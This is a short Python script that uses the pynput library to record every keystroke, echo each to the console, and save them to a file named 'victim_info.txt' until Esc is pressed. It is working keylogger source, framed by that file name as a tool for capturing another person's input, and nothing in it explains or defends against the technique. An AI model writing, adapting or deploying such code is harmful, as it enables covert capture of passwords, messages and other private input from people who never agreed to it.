
 
import pynput
from pynput.keyboard import Key, Listener
 
keys = []
 
 
def on_press(key):
    keys.append(key)
    write_file(keys)
 
    try:
        print('key {0} is pressed'.format(key.char))
 
    except AttributeError:
        print('special key {0} pressed'.format(key))
 
 
def write_file(keys):
    with open('victim_info.txt', 'w') as f: #save in this file
        for key in keys:
            # removing ''
            k = str(key).replace("'", "")
            f.write(k)
 
 
           
            f.write(' ')
 
def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop listener
        return False
 
 
with Listener(on_press=on_press,
              on_release=on_release) as listener:
    listener.join()
